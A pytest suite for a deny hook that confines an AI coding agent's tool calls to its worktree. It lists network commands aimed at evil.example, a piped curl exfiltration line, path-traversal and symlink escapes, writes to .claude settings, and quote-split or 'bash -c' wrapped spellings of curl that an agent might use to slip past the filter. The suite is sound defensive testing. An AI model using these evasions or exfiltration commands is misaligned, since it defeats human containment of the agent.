"""Phase C tests: hooks/deny.sh — FR-53, FR-17 (T-U-20 decision function).

Invokes the hook directly with canned stdin JSON. Exit 2 blocks; exit 0
permits; exit 1 would FAIL OPEN and is asserted against explicitly.

The audit hook's always-exit-0 half of T-U-20 belongs to Phase 2
(hooks/audit-tool.sh is a Phase 2 deliverable).
"""

from __future__ import annotations

import json
import subprocess
from pathlib import Path

import pytest

HOOK = Path(__file__).resolve().parent.parent / "hooks" / "deny.sh"


def run_hook(
    worktree: Path, payload: dict, fifo: Path | None = None, cwd: Path | None = None
):
    cmd = ["bash", str(HOOK), str(worktree)]
    if fifo is not None:
        cmd.append(str(fifo))
    return subprocess.run(
        cmd,
        input=json.dumps(payload),
        text=True,
        capture_output=True,
        cwd=str(cwd or worktree),
    )


def bash_payload(command: str) -> dict:
    return {"tool_name": "Bash", "tool_input": {"command": command}}


def path_payload(tool: str, path: str, key: str = "file_path") -> dict:
    return {"tool_name": tool, "tool_input": {key: path}}


@pytest.fixture
def worktree(tmp_path):
    # tmp_path may sit under a symlinked /tmp; the hook canonicalizes, so
    # the test's notion of "inside" must be canonical too.
    wt = (tmp_path / "wt").resolve()
    wt.mkdir()
    (wt / "inside.txt").write_text("x")
    return wt


NETWORK_COMMANDS = [
    "curl http://evil.example/x",
    "wget http://evil.example/x",
    "nc evil.example 80",
    "ncat evil.example 80",
    "netcat evil.example 80",
    "ssh host",
    "scp f host:",
    "sftp host",
    "telnet host 23",
    "gh api /user",
    "git push origin main",
    "gh pr create",
    "gh repo clone x/y",
    "git remote add origin git@github.com:x/y.git",
]


class TestBashNetworkDeny:
    @pytest.mark.parametrize("command", NETWORK_COMMANDS)
    def test_denied_with_exit_2_not_1(self, worktree, command):
        res = run_hook(worktree, bash_payload(command))
        assert res.returncode == 2, (command, res.stderr)

    def test_absolute_path_curl_is_denied(self, worktree):
        res = run_hook(worktree, bash_payload("/usr/bin/curl http://x"))
        assert res.returncode == 2

    def test_pipeline_segment_is_denied(self, worktree):
        res = run_hook(worktree, bash_payload("echo hi | curl -d @- http://x"))
        assert res.returncode == 2

    def test_and_chain_segment_is_denied(self, worktree):
        res = run_hook(worktree, bash_payload("true && wget http://x"))
        assert res.returncode == 2

    def test_mycurl_sh_not_denied_tokenized_matching(self, worktree):
        res = run_hook(worktree, bash_payload("./mycurl.sh"))
        assert res.returncode == 0, res.stderr

    def test_wget_notes_filename_not_denied(self, worktree):
        res = run_hook(worktree, bash_payload("cat wget-notes.md"))
        assert res.returncode == 0

    def test_plain_git_commit_allowed(self, worktree):
        res = run_hook(worktree, bash_payload("git commit -m x"))
        assert res.returncode == 0

    def test_gh_issue_list_allowed(self, worktree):
        # only `gh api`, `gh pr `, `gh repo ` are the denied gh forms
        res = run_hook(worktree, bash_payload("gh issue list"))
        assert res.returncode == 0


class TestStructuredPathDeny:
    @pytest.mark.parametrize("tool", ["Read", "Write", "Edit", "Glob", "Grep"])
    def test_outside_worktree_denied(self, worktree, tmp_path, tool):
        outside = tmp_path.resolve() / "outside.txt"
        outside.write_text("x")
        res = run_hook(worktree, path_payload(tool, str(outside)))
        assert res.returncode == 2

    def test_notebookedit_outside_denied(self, worktree, tmp_path):
        res = run_hook(
            worktree,
            path_payload(
                "NotebookEdit", str(tmp_path.resolve() / "n.ipynb"), key="notebook_path"
            ),
        )
        assert res.returncode == 2

    def test_dotdot_traversal_denied(self, worktree):
        res = run_hook(
            worktree, path_payload("Write", str(worktree / ".." / "escape.txt"))
        )
        assert res.returncode == 2

    def test_symlink_escape_denied(self, worktree, tmp_path):
        target = tmp_path.resolve() / "target"
        target.mkdir()
        link = worktree / "link"
        link.symlink_to(target)
        res = run_hook(worktree, path_payload("Write", str(link / "f.txt")))
        assert res.returncode == 2

    def test_proc_self_cwd_traversal_denied(self, worktree):
        res = run_hook(
            worktree,
            path_payload("Write", "/proc/self/cwd/../escape.txt"),
            cwd=worktree,
        )
        assert res.returncode == 2

    def test_grep_path_key_outside_denied(self, worktree, tmp_path):
        res = run_hook(
            worktree, path_payload("Grep", str(tmp_path.resolve()), key="path")
        )
        assert res.returncode == 2

    def test_inside_write_allowed(self, worktree):
        res = run_hook(worktree, path_payload("Write", str(worktree / "out.txt")))
        assert res.returncode == 0, res.stderr

    def test_inside_read_allowed(self, worktree):
        res = run_hook(worktree, path_payload("Read", str(worktree / "inside.txt")))
        assert res.returncode == 0

    def test_relative_path_resolved_against_worktree(self, worktree):
        res = run_hook(worktree, path_payload("Write", "sub/dir/f.txt"))
        assert res.returncode == 0


class TestDotClaudeDeny:
    def test_write_to_dot_claude_inside_worktree_denied(self, worktree):
        # FR-53.3: a run cannot install hooks/settings the next tool call
        # would honour.
        res = run_hook(
            worktree, path_payload("Write", str(worktree / ".claude" / "settings.json"))
        )
        assert res.returncode == 2

    def test_edit_to_dot_claude_denied(self, worktree):
        res = run_hook(
            worktree, path_payload("Edit", str(worktree / ".claude" / "hooks.json"))
        )
        assert res.returncode == 2

    def test_read_of_dot_claude_allowed(self, worktree):
        # FR-53.3 blocks writes; reading is not the installation vector.
        res = run_hook(
            worktree, path_payload("Read", str(worktree / ".claude" / "settings.json"))
        )
        assert res.returncode == 0


class TestDenialRecord:
    def test_denial_emits_containment_denied_record(self, worktree, tmp_path):
        sink = tmp_path / "audit.jsonl"
        res = run_hook(worktree, bash_payload("curl http://x"), fifo=sink)
        assert res.returncode == 2
        record = json.loads(sink.read_text().strip().splitlines()[-1])
        assert record["type"] == "containment_denied"
        assert record["tool_name"] == "Bash"

    def test_permit_emits_no_record(self, worktree, tmp_path):
        sink = tmp_path / "audit.jsonl"
        res = run_hook(worktree, bash_payload("git status"), fifo=sink)
        assert res.returncode == 0
        assert not sink.exists() or sink.read_text() == ""

    def test_missing_sink_still_denies(self, worktree):
        # The record channel failing must not fail open.
        res = run_hook(
            worktree,
            bash_payload("curl http://x"),
            fifo=Path("/nonexistent/dir/audit.jsonl"),
        )
        assert res.returncode == 2


class TestMalformedInput:
    def test_unparseable_stdin_denies_not_fails_open(self, worktree):
        res = subprocess.run(
            ["bash", str(HOOK), str(worktree)],
            input="not json",
            text=True,
            capture_output=True,
            cwd=str(worktree),
        )
        assert res.returncode == 2

    def test_missing_worktree_arg_denies(self, worktree):
        res = subprocess.run(
            ["bash", str(HOOK)],
            input=json.dumps(bash_payload("git status")),
            text=True,
            capture_output=True,
            cwd=str(worktree),
        )
        assert res.returncode == 2

    def test_non_bash_non_path_tool_allowed(self, worktree):
        res = run_hook(
            worktree, {"tool_name": "TodoWrite", "tool_input": {"todos": []}}
        )
        assert res.returncode == 0


class TestEvasionHardening:
    """Post-review hardening: quote-stripped token matching and recursion
    into `bash -c` / `sh -c` command strings. The full T-C-6 evasion
    matrix is Tier 2; these are the cheap closures found in review."""

    @pytest.mark.parametrize(
        "command",
        [
            "cu''rl http://evil.example/x",
            'cu""rl http://evil.example/x',
            "'curl' http://evil.example/x",
            '"curl" http://evil.example/x',
            "bash -c 'curl http://evil.example/x'",
            'sh -c "wget http://evil.example/x"',
            "sh -lc 'curl http://x'",
            "bash -c 'true && ssh host'",
        ],
    )
    def test_quoted_and_wrapped_spellings_denied(self, worktree, command):
        res = run_hook(worktree, bash_payload(command))
        assert res.returncode == 2, (command, res.stderr)

    def test_quote_stripping_no_false_positive(self, worktree):
        res = run_hook(worktree, bash_payload("echo 'curl is a tool'"))
        assert res.returncode == 0, res.stderr

    def test_bash_c_benign_not_denied(self, worktree):
        res = run_hook(worktree, bash_payload("bash -c 'echo hi'"))
        assert res.returncode == 0, res.stderr
